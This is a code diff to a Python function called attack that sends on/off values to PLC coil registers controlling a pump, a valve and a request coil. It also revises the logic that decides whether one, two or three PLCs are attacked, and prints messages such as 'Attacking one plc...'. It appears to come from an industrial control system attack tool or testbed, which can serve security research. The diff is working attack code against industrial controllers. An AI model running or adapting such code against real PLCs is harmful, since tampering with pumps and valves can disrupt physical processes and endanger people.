@@ -101,21 +101,21 @@ def attack(ctx):
     
     def trigger_operation_plc1(p_val):
         if  int(config.get('params', 'coil1')) == 1:
-            plc_1_coil_register_pump.write(int(pckt_value))
+            plc_1_coil_register_pump.write(int(p_val))
             print ("Writing on %QX0.0 - pump - PLC 1 ")
 
         if int(config.get('params', 'coil2')) == 1:
-            plc_1_coil_register_valve.write(int(pckt_value))
+            plc_1_coil_register_valve.write(int(p_val))
             print ("Writing on %QX0.0 - register - PLC 1 ")
 
         if int(config.get('params', 'coil3')) == 1:
-            plc_1_coil_register_request.write(int(pckt_value))
+            plc_1_coil_register_request.write(int(p_val))
             print ("Writing on %QX0.0 - request - PLC 1 ")
         
         if(p_val == 0):
-            print('COMMAND OFF - Value wrote: ', pckt_value)
+            print('COMMAND OFF - Value wrote: ', p_val)
         elif(p_val == 1):
-            print('COMMAND ON - Value wrote: ', pckt_value)
+            print('COMMAND ON - Value wrote: ', p_val)
 
     
     """
@@ -151,16 +151,16 @@ def attack(ctx):
        
     # PLC attack
     # ONE PLC selected
-    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc2') == "none" and config.get('plc', 'plc3') == "none":
+    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc2') == config.get('plc', 'plc1') and config.get('plc', 'plc3') == config.get('plc', 'plc1'):
         print("Attacking one plc...")
         plc_1_input_register.start_polling(500, on_level_change_plc1())
 
     # TWO PLCs selected
-    if config.get('plc', 'plc1') != "" and (config.get('plc', 'plc2') != "none" or config.get('plc', 'plc3') != "none"):
+    if config.get('plc', 'plc1') != "" and (config.get('plc', 'plc2') != config.get('plc', 'plc1') or config.get('plc', 'plc3') != config.get('plc', 'plc1')):
         print("Attacking two plcs...")
 
     # THREE PLCs selected 
-    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc2') != "none" and config.get('plc', 'plc3') != "none":
+    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc2') != config.get('plc', 'plc1') and config.get('plc', 'plc3') != config.get('plc', 'plc1'):
         print("Attacking three plcs...")
 
 
